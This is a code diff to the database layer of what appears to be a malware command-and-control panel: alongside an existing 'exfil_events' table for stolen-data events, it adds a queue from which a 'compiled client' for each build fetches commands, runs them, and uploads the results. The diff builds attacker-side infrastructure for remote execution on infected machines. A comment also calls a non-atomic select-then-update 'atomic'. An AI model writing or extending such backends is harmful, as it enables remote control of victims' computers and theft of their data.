@@ -94,6 +94,24 @@ async function initDatabase() {
         'CREATE INDEX IF NOT EXISTS idx_exfil_created ON exfil_events (createdAt)'
     );
 
+    // 5. Remote command queue. The compiled client polls for pending commands
+    //     for its buildId, executes them, and uploads the result back here.
+    await run(`
+        CREATE TABLE IF NOT EXISTS commands (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            buildId TEXT NOT NULL,
+            type TEXT NOT NULL,
+            args TEXT DEFAULT '',
+            status TEXT NOT NULL DEFAULT 'pending',
+            result TEXT,
+            createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
+            completedAt DATETIME
+        )
+    `);
+    await run(
+        'CREATE INDEX IF NOT EXISTS idx_cmd_build ON commands (buildId, status)'
+    );
+
     // Seed default admin if no users exist
     const userCount = await get('SELECT COUNT(*) as count FROM users');
     if (userCount.count === 0) {
@@ -196,6 +214,45 @@ module.exports = {
     async countEvents(buildId, type) {
         const row = await get('SELECT COUNT(*) as count FROM exfil_events WHERE buildId = ? AND type = ?', [buildId, type]);
         return (row && row.count) || 0;
+    },
+
+    // Remote command queue
+    async createCommand(buildId, type, args = '') {
+        const result = await run(
+            'INSERT INTO commands (buildId, type, args) VALUES (?, ?, ?)',
+            [buildId, type, args]
+        );
+        return result.id;
+    },
+
+    async listCommands(buildId, limit = 50) {
+        return await all(
+            'SELECT * FROM commands WHERE buildId = ? ORDER BY id DESC LIMIT ?',
+            [buildId, limit]
+        );
+    },
+
+    // Claim the oldest pending command for a build: atomically mark it running
+    // so concurrent polls cannot hand the same command to two clients.
+    async claimPendingCommand(buildId) {
+        const row = await get(
+            "SELECT * FROM commands WHERE buildId = ? AND status = 'pending' ORDER BY id LIMIT 1",
+            [buildId]
+        );
+        if (!row) return null;
+        await run("UPDATE commands SET status = 'running' WHERE id = ?", [row.id]);
+        return row;
+    },
+
+    async completeCommand(id, status, result = null) {
+        await run(
+            "UPDATE commands SET status = ?, result = ?, completedAt = CURRENT_TIMESTAMP WHERE id = ?",
+            [status, result, id]
+        );
+    },
+
+    async getCommand(id) {
+        return await get('SELECT * FROM commands WHERE id = ?', [id]);
     },
 
     // Log Action Helper
